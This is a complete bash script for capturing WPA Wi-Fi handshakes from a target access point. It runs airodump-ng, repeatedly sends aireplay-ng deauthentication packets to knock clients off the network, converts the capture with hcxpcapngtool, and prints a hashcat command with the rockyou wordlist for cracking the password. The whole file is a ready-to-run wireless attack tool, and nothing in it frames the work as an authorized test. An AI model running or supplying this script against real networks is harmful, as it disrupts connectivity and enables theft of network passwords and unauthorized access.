#!/bin/bash
# Full Handshake Capture Script (with controlled deauth)
# Usage: ./capture_handshake.sh <BSSID> <CHANNEL> <SSID> <DURATION> <DEAUTH_INTERVAL>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./capture_handshake.sh <BSSID> <CHANNEL> <SSID> <DURATION> <DEAUTH_INTERVAL>"
    echo "Example: ./capture_handshake.sh 30:68:93:AC:96:AD 6 hackme 60 10"
    echo ""
    echo "DURATION: Total capture time in seconds"
    echo "DEAUTH_INTERVAL: Seconds between deauth packets"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
DURATION=${4:-60}
DEAUTH_INTERVAL=${5:-10}
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
# Replace spaces and special chars with underscores
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp in format: 01-19am_10-21-2025
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP"

echo "[*] Full handshake capture with timed deauth"
echo "[*] Target: $BSSID"
echo "[*] Channel: $CHANNEL"
echo "[*] Duration: $DURATION seconds"
echo "[*] Deauth every: $DEAUTH_INTERVAL seconds"
echo ""

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Start capture in background
echo "[*] Starting packet capture..."
sudo timeout $DURATION airodump-ng -c $CHANNEL --bssid $BSSID -w "$OUTPUT_PREFIX" --output-format pcapng alfa0 >/dev/null 2>&1 &
AIRODUMP_PID=$!

# Wait for airodump to initialize
sleep 3

# Calculate how many deauth packets to send
NUM_DEAUTHS=$((DURATION / DEAUTH_INTERVAL))

# Send deauth packets at intervals
echo "[*] Sending deauth packets every $DEAUTH_INTERVAL seconds..."
for i in $(seq 1 $NUM_DEAUTHS); do
    sudo aireplay-ng -0 1 -a $BSSID alfa0 >/dev/null 2>&1
    echo "[*] Deauth $i/$NUM_DEAUTHS sent"
    
    # Sleep unless this is the last one
    if [ $i -lt $NUM_DEAUTHS ]; then
        sleep $DEAUTH_INTERVAL
    fi
done

# Wait for capture to complete
echo "[*] Waiting for capture to finish..."
wait $AIRODUMP_PID

# Check if we got a capture file (.pcapng or .cap)
CAPTURE_FILE=""
if [ -f "${OUTPUT_PREFIX}-01.pcapng" ]; then
    CAPTURE_FILE="${OUTPUT_PREFIX}-01.pcapng"
elif [ -f "${OUTPUT_PREFIX}-01.cap" ]; then
    CAPTURE_FILE="${OUTPUT_PREFIX}-01.cap"
fi

if [ -n "$CAPTURE_FILE" ]; then
    echo ""
    echo "[+] Capture complete: $(basename $CAPTURE_FILE)"
    echo "[*] Converting to hashcat format..."
    
    # Convert to hashcat format
    hcxpcapngtool -o "${OUTPUT_PREFIX}.hc22000" "$CAPTURE_FILE" >/dev/null 2>&1
    
    if [ -f "${OUTPUT_PREFIX}.hc22000" ] && [ -s "${OUTPUT_PREFIX}.hc22000" ]; then
        echo ""
        echo "[+] Hash file ready: ${OUTPUT_PREFIX}.hc22000"
        echo ""
        echo "[*] To crack:"
        echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
    else
        echo "[-] No valid handshake found in capture"
        echo "[!] Try running longer or with shorter deauth interval"
    fi
else
    echo "[-] Capture failed"
fi

# Cleanup extra files
rm -f "${OUTPUT_PREFIX}-01.csv" "${OUTPUT_PREFIX}-01.kismet.csv" "${OUTPUT_PREFIX}-01.kismet.netxml" 2>/dev/null
